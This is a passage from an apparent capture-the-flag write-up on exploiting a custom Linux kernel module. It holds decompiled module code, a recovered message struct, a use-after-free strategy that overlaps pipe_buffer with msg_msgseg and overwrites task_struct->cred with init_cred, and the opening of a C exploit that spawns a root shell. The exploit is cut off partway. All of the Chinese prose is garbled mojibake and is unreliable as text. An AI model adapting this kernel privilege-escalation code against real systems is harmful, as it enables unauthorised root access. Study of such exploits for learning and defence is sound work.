v9; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">void</span> *v10; <span class="hljs-comment">// rdi</span><br>  __int64 v11[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br><br>  v11[<span class="hljs-number">0</span>] = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">while</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)kkk_read_u2k_queue(v11) )<br>        msleep(<span class="hljs-number">1000LL</span>);<br>      v0 = v11[<span class="hljs-number">0</span>];<br>      <span class="hljs-keyword">if</span> ( *(_WORD *)v11[<span class="hljs-number">0</span>] == <span class="hljs-number">1</span> )<br>        <span class="hljs-keyword">break</span>;<br>      printk(&amp;unk_1743);<br>LABEL_24:<br>      msg_free(v11[<span class="hljs-number">0</span>]);<br>    &#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯ä¸€ä¸ªå·¨å¤§çš„ switchï¼Œæ ¹æ®ä» <code>u2k</code> é˜Ÿåˆ—ä¸­å–å‡ºçš„ object æŒ‡å®šå­—æ®µçš„å€¼è¿›è¡Œç›¸åº”å¤„ç†ï¼Œä¸»è¦å®ç°äº† <code>tea</code> åŠ å¯†ã€<code>tea</code> è§£å¯†ã€<code>md5</code> å“ˆå¸Œç®—æ³•ä¸‰ç§åŠŸèƒ½</p><p>åœ¨å®Œæˆè¯·æ±‚åä¼šæ ¹æ®é€‰é¡¹ä¸åŒä¸æ‰§è¡Œç»“æœä¸åŒé€‰æ‹©æ˜¯å¦å°†è¯¥ object é‡ç”¨å¹¶å†™å…¥ <code>k2u</code> é˜Ÿåˆ—æˆ–æ˜¯åˆ†é…ä¸€ä¸ªæ–°çš„ <code>object</code> å†™å…¥ <code>k2u</code> é˜Ÿåˆ—ï¼Œå¯¹äº <code>md5</code> å“ˆå¸Œè¯·æ±‚è€Œè¨€æ€»ä¼šåˆ†é…ä¸€ä¸ªæ–°çš„ objectï¼Œè€Œ <code>tea</code> åŠ è§£å¯†è¯·æ±‚åˆ™ä¼šï¼Œä½œä¸ºè¯·æ±‚æ‰§è¡Œçš„ç»“æœè¿”å›ç»™ç”¨æˆ·ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-keyword">switch</span> ( v1 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        v5 = msg_alloc(<span class="hljs-number">16LL</span>);<br>        <span class="hljs-keyword">if</span> ( v5 )<br>        &#123;<br>          v4 = v5;<br>          <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)kkk_crypto_hash_md5((<span class="hljs-type">void</span> *)(v0 + <span class="hljs-number">24</span>), *(_QWORD *)(v0 + <span class="hljs-number">16</span>)) )<br>          &#123;<br>            printk(&amp;unk_17E1);<br>            v7 = <span class="hljs-number">2</span>;<br>            v6 = <span class="hljs-number">0LL</span>;<br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>            v6 = <span class="hljs-number">16LL</span>;<br>            v7 = <span class="hljs-number">1</span>;<br>          &#125;<br>          *(_DWORD *)v4 = <span class="hljs-number">196610</span>;<br>          *(_WORD *)(v4 + <span class="hljs-number">4</span>) = v7;<br>          *(_QWORD *)(v4 + <span class="hljs-number">8</span>) = *(_QWORD *)(v0 + <span class="hljs-number">8</span>);<br>          <span class="hljs-keyword">goto</span> LABEL_23;<br>        &#125;<br>        <span class="hljs-keyword">goto</span> LABEL_32;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        v8 = *(_QWORD *)(v11[<span class="hljs-number">0</span>] + <span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">if</span> ( v8 &lt; <span class="hljs-number">0x18</span> || (v8 &amp; <span class="hljs-number">7</span>) != <span class="hljs-number">0</span> )<br>        &#123;<br>          v10 = &amp;unk_17AD;<br>          <span class="hljs-keyword">goto</span> LABEL_31;<br>        &#125;<br>        v9 = msg_alloc(v8 - <span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">if</span> ( !v9 )<br>        &#123;<br>LABEL_27:<br>          v10 = &amp;unk_1795;<br>LABEL_31:<br>          printk(v10);<br>          <span class="hljs-keyword">goto</span> LABEL_32;<br>        &#125;<br>        v4 = v9;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)kkk_crypto_tea_decrypt((<span class="hljs-type">void</span> *)(v0 + <span class="hljs-number">40</span>), *(_QWORD *)(v0 + <span class="hljs-number">16</span>) - <span class="hljs-number">16LL</span>) &gt;= <span class="hljs-number">0</span> )<br>        &#123;<br>          *(_DWORD *)v4 = <span class="hljs-number">131074</span>;<br>LABEL_22:<br>          *(_WORD *)(v4 + <span class="hljs-number">4</span>) = <span class="hljs-number">1</span>;<br>          *(_QWORD *)(v4 + <span class="hljs-number">8</span>) = *(_QWORD *)(v0 + <span class="hljs-number">8</span>);<br>          v6 = *(_QWORD *)(v0 + <span class="hljs-number">16</span>) - <span class="hljs-number">16LL</span>;<br>LABEL_23:<br>          *(_QWORD *)(v4 + <span class="hljs-number">16</span>) = v6;<br>          kkk_write_k2u_queue(v4);<br>          <span class="hljs-keyword">goto</span> LABEL_24;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        v2 = *(_QWORD *)(v11[<span class="hljs-number">0</span>] + <span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">if</span> ( v2 &lt; <span class="hljs-number">0x18</span> || (v2 &amp; <span class="hljs-number">7</span>) != <span class="hljs-number">0</span> )<br>        &#123;<br>          v10 = &amp;unk_1761;<br>          <span class="hljs-keyword">goto</span> LABEL_31;<br>        &#125;<br>        v3 = msg_alloc(v2 - <span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">if</span> ( !v3 )<br>          <span class="hljs-keyword">goto</span> LABEL_27;<br>        v4 = v3;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)kkk_crypto_tea_encrypt((<span class="hljs-type">void</span> *)(v0 + <span class="hljs-number">40</span>), *(_QWORD *)(v0 + <span class="hljs-number">16</span>) - <span class="hljs-number">16LL</span>) &gt;= <span class="hljs-number">0</span> )<br>        &#123;<br>          *(_DWORD *)v4 = (_DWORD)&amp;unk_10002;<br>          <span class="hljs-keyword">goto</span> LABEL_22;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        *(_WORD *)v11[<span class="hljs-number">0</span>] = <span class="hljs-number">2</span>;<br>        *(_WORD *)(v0 + <span class="hljs-number">4</span>) = <span class="hljs-number">2</span>;<br>        printk(&amp;unk_1808);<br>        <span class="hljs-keyword">goto</span> LABEL_33;<br>    &#125;<br>    kfree(v4);<br>LABEL_32:<br>    *(_WORD *)v0 = <span class="hljs-number">2</span>;<br>    *(_WORD *)(v0 + <span class="hljs-number">4</span>) = <span class="hljs-number">2</span>;<br>LABEL_33:<br>    kkk_write_k2u_queue(v0);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é€†å‘åˆ†ææˆ‘ä»¬ä¸éš¾è·å¾— <code>u2k</code> ä¸ <code>k2u</code> é˜Ÿåˆ—ä¸­çš„ object çš„ç»“æ„ä½“å®šä¹‰ï¼š</p><blockquote><p><del>ğŸ‘´è‡ªå·±é€†åŠå¤©å¾—çš„ï¼Œæ²¡æœ‰å·å·çœ‹æºç </del></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_REQUEST    1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_REPLY      2</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_ENCRYPT_TEA     1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_DECRYPT_TEA     2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_HASH_MD5        3</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_SUCCESS      1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_FAIL         2</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_hdr</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span> type;<br>    <span class="hljs-type">uint16_t</span> cmd;<br>    <span class="hljs-type">uint32_t</span> status;<br>    <span class="hljs-type">uint64_t</span> tag;<br>    <span class="hljs-type">uint64_t</span> data_len;<br>    <span class="hljs-type">uint8_t</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆè¿™ä¸ªå†…æ ¸æ¨¡å—çš„å…¨è²Œä¾¿å·²ç»å±•ç°åœ¨æˆ‘ä»¬é¢å‰äº†ï¼šç”¨æˆ·é€šè¿‡ <code>ioctl()</code> å‘è¯·æ±‚é˜Ÿåˆ— <code>u2k</code> ä¸­æ”¾å…¥è¯·æ±‚æ¶ˆæ¯ï¼ˆæ¯æ¡æ¶ˆæ¯é™„å¸¦ä¸€ä¸ª headerï¼‰ï¼Œå†…æ ¸çº¿ç¨‹å¼‚æ­¥åœ°ä» <code>u2k</code> é˜Ÿåˆ—ä¸­è¯»å–æ¶ˆæ¯ï¼Œæ ¹æ®å…¶ç±»å‹è¿›è¡Œå¤„ç†ï¼Œå®Œæˆä¹‹åå°†ç»“æœæ”¾å› <code>k2u</code> é˜Ÿåˆ—ï¼Œç”±ç”¨æˆ·è¿›è¡Œå¼‚æ­¥è¯»å–ï¼›å¯¹äºè¯·æ±‚ä¸å“åº”æ¶ˆæ¯é•¿åº¦ç›¸åŒçš„ï¼Œå†…æ ¸ä¼šå¤ç”¨ç›¸åº”çš„ objectï¼Œå¦åˆ™ä¼šåˆ†é…æ–°çš„ object ä½œä¸ºè¿”å›ç»“æœå¹¶é‡Šæ”¾å‚¨å­˜åŸæœ‰è¯·æ±‚ä¿¡æ¯çš„ object</p><p>ä¸¥æ ¼æ„ä¹‰ä¸Šæ¥è¯´è¿™é“é¢˜å…¶å®æ²¡æœ‰å®Œå…¨å®Œæˆï¼Œç¬”è€…åŸæœ¬æƒ³è¦å†™ä¸€ä¸ªå®Œæ•´çš„ç”¨æˆ·ä¸å†…æ ¸é—´çš„  <em>å¼‚æ­¥é€šä¿¡æ¶ˆæ¯å¤„ç†æ¡†æ¶</em>  ï¼Œä½†æ˜¯æœ€ååªå®Œæˆäº†å¼‚æ­¥é€šä¿¡é˜Ÿåˆ—ï¼Œæ²¡æœ‰å®ŒæˆåŸºäºå†…å­˜å…±äº«çš„çŠ¶æ€æŸ¥è¯¢éƒ¨åˆ†ï¼Œä¸è¿‡æˆ‘ä»¬ä»èƒ½é€šè¿‡ <code>ioctl()</code> ç›´æ¥è¯»å–çš„æ–¹å¼å®Œæˆè½®è¯¢ï¼Œå°±æ˜¯å¼€é”€å·¨å¤§ï¼šï¼‰</p><h2 id="æ¼æ´åˆ©ç”¨-1"><a href="#æ¼æ´åˆ©ç”¨-1" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>åˆ©ç”¨ UAF å°† <code>pipe_buffer</code> å’Œ <code>msg_msgseg</code> åˆ†é…åˆ°ä¸€èµ·ï¼Œè¯»å†™ pipe ä½¿å¾—å…¶ä½¿ç”¨ <code>pipe_buffer[1]</code> ä»¥é¿å… <code>msg_msgseg</code> å¼€å¤´çš„ NULL å¹²æ‰°ï¼Œä¹‹åä¸æ–­é‡åˆ†é… <code>msg_msgseg</code> è¿›è¡Œå†…å­˜æœç´¢æ‰¾åˆ°å½“å‰è¿›ç¨‹çš„ <code>task_struct</code> å¹¶å°† <code>task_struct-&gt;cred</code> æ”¹ä¸º <code>init_cred</code> å³å¯å®Œæˆææƒ</p><p>è¿™é‡Œæ²¡æœ‰é€‰æ‹©å°†ä¸¤ä¸ª <code>pipe_buffer</code> åˆ†é…åˆ°åŒä¸€ä¸ª object çš„æ–¹å¼æ˜¯å› ä¸º<strong>é¢˜ç›®å¼€å¯äº†</strong> <code>CONFIG_INIT_ON_FREE_DEFAULT_ON</code> <strong>ï¼Œæ‰€æœ‰çš„å†…æ ¸å¯¹è±¡åœ¨é‡Šæ”¾åéƒ½ä¼šè¢«æ¸…é›¶</strong>ï¼Œå› æ­¤æˆ‘ä»¬å¾ˆéš¾ç›´æ¥æ„é€ å‡º page-level UAF</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * I - fundamental functions</span><br><span class="hljs-comment"> * e.g. CPU-core binder, user-status saver, etc.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">size_t</span> kernel_base = <span class="hljs-number">0xffffffff81000000</span>, kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> page_offset_base = <span class="hljs-number">0xffff888000000000</span>, vmemmap_base = <span class="hljs-number">0xffffea0000000000</span>;<br><span class="hljs-type">size_t</span> init_task, init_nsproxy, init_cred;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">direct_map_addr_to_page_addr</span><span class="hljs-params">(<span class="hljs-type">size_t</span> direct_map_addr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> page_count;<br><br>    page_count = ((direct_map_addr &amp; (~<span class="hljs-number">0xfff</span>)) - page_offset_base) / <span class="hljs-number">0x1000</span>;<br>    <br>    <span class="hljs-keyword">return</span> vmemmap_base + page_count * <span class="hljs-number">0x40</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-comment">/* root checker and shell poper */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for root...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);<br>    <br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-comment">/* userspace status saver */</span><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span 